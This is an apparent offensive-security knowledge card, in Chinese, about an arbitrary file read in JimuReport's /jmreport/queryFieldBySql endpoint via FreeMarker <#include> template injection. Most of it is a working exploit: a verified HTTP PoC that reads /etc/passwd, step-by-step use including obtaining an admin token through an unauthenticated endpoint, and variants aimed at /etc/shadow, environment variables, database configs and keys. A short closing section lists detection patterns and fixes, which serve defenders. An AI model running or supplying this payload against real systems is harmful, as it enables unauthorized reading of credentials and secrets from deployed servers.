---
id: web-java-component-jimureport-queryfieldbysql-freemarker-include-file-read
title: JimuReport /jmreport/queryFieldBySql 的 FreeMarker <#include> 任意文件读取
type: scenario
domain: web
path: web/java/component
technique: jimureport-freemarker-include-file-read
aliases:
- 积木报表任意文件读取
- queryFieldBySql 文件读取
- FreeMarker include 读文件
- <#include "/etc/passwd">
- JimuReport 报表 SQL 模板注入
tags:
- java
- jimureport
- jeecgboot
- freemarker
- ssti
- file-read
- include
- queryfieldbysql
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V65
  verified_at: '2026-11-05T12:04:21+08:00'
  notes: 已对照全文与图04核对：POST /zhq/jmreport/queryFieldBySql，body {"sql":"select '<#include \"/etc/passwd\">'"} 返回 success=true，fieldList 的 fieldName/fieldText 直接回显 root:x:0:0:root:/root:/bin/bash 等 /etc/passwd 内容，与卡内 PoC 一致。未验证点：卡内 FreeMarkerUtils new Template(...).process 为实现层补充，原文只给 payload 与回显、未展示源码；<#include> 可读范围取决于模板加载器；PoC 未在本机执行。frontmatter 无 sources/source_url（全库惯例）。
---

## 一句话结论

JimuReport 的 `/jmreport/queryFieldBySql` 把请求中的 `sql` 当作 FreeMarker 模板渲染；提交 `select '<#include "/etc/passwd">'` 时，FreeMarker 的 `<#include>` 指令会读取目标文件并把内容插入渲染结果，随后作为查询列名/字段值返回，形成任意文件读取。

## 原理

- `/jmreport/queryFieldBySql` 接收 `sql` 参数并进入 FreeMarker 模板渲染（JimuReport 的 `FreeMarkerUtils` 用 `new Template(...).process(...)` 渲染 SQL 字符串），再把渲染后的 SQL 交给数据库查询。
- FreeMarker 的 `<#include path>` 是内置指令，用于把另一个模板/文件的内容包含进当前模板；它由模板加载器解析，不需要 `?new`、`?api` 或任何表达式引擎。模板里出现 `<#include "/etc/passwd">` 时，FreeMarker 会读取该路径并替换为文件内容。
- 因为整个 `sql` 字符串是模板，`select '<#include "/etc/passwd">'` 渲染后变成 `select '<文件内容>'`；数据库把它当作字符串常量，列名/字段值随查询结果返回。攻击者从 `fieldList[].fieldName`/`fieldText` 读到文件内容。
- 这条链与 `jeecg.compute` → Aviator RCE 的区别：不需要业务对象、不需要 Aviator、也不需要 `?new` 绕过；利用的是 FreeMarker 自带的文件包含指令，属于更简单的文件读取原语，最终危害是任意文件读取而非命令执行。
- 原文在已取得管理员 token 后利用该接口；接口本身是否需要认证取决于部署（部分 JimuReport 版本/配置对 `/jmreport/*` 未做鉴权），需按目标实测。

## 触发条件

- 目标集成 JimuReport 并暴露 `/jmreport/queryFieldBySql`。
- `sql` 参数会进入 FreeMarker 模板渲染，且 `<#include>` 未被禁用、模板加载器允许解析目标路径。
- 攻击者能访问接口（本文为管理员 token；若端点未鉴权则无需 token）。
- 目标文件对应用进程可读（如 `/etc/passwd`、应用配置文件、源码）。

## 利用步骤

1. 获取可用 token（本文经未授权 `getTokenById` 取得管理员 token，或正常登录）。
2. 提交基线请求 `{"sql":"select 1"}`，确认接口返回 `fieldList`。
3. 提交 `{"sql":"select '<#include \"/etc/passwd\">'"}`，观察 `fieldList` 中是否出现 `/etc/passwd` 内容。
4. 替换路径读取应用配置、数据库连接串、源码、密钥文件等。
5. 若 `<#include>` 被过滤，尝试其他 FreeMarker 指令/内建（如 `<#assign>` 配合 `?read` 等），或转向同接口的 SQL 注入/表达式注入。

## PoC

```http
POST /zhq/jmreport/queryFieldBySql HTTP/1.1
Host: target
Authorization: Bearer <token>
Content-Type: application/json

{
  "sql": "select '<#include \"/etc/passwd\">'"
}
```

```json
// 响应（截断）：fieldList[].fieldName / fieldText 中出现
// root:x:0:0:root:/root:/bin/bash
// daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
// ...
```

## 变体与关联

- 变体：读取 `/etc/shadow`（需应用进程 root 权限）、`/proc/self/environ`、应用 `application.yml`/`application.properties`、数据库配置、源码与日志。
- 变体：`<#include>` 支持相对/绝对路径，具体可读范围取决于 FreeMarker 模板加载器配置；可先读 `/etc/passwd` 确认原语，再按应用目录结构扩展。
- 变体：同接口还存在 SQL 注入（见关联卡）与 `jeecg.compute` Aviator RCE（见关联卡），三者可独立利用。
- 关联：[[web-java-component-jimureport-freemarker-jeecg-compute-aviator-rce]]（同接口的 FreeMarker→Aviator RCE）、[[web-java-component-jimureport-queryfieldbysql-time-blind-sqli]]（同接口的时间盲注）、[[web-generic-ssti-freemarker-classpath-resource-read]]（FreeMarker 读 classpath 配置的通用手法）。
- 边界：JimuReport 升级/加固后禁用模板渲染或过滤 `<#include>`、接口加鉴权且攻击者无 token、模板加载器限制路径、目标文件不可读时，本场景不成立。

## 检测与防御

- 检测：请求体 `sql` 中出现 `<#include`、`<#assign`、`${` 等 FreeMarker 语法；响应 `fieldList` 出现 `/etc/passwd`、`root:x:0:0`、配置键值等非业务内容；报表接口返回异常长字符串或文件内容。
- 修复：升级 JimuReport 到修复版本；不要对用户可控 `sql` 做 FreeMarker 模板渲染；如必须渲染，使用 `ALLOWS_NOTHING_RESOLVER`、禁用 `<#include>`/`<#import>` 等指令，并对模板做 AST 白名单。
- 加固：对 `/jmreport/*` 加真实鉴权与网络隔离；最小化应用进程文件读权限；WAF 阻断 `sql` 中的 `<#include`、`<#assign`、`${jeecg.` 等组合；审计报表接口的异常文件内容回显。
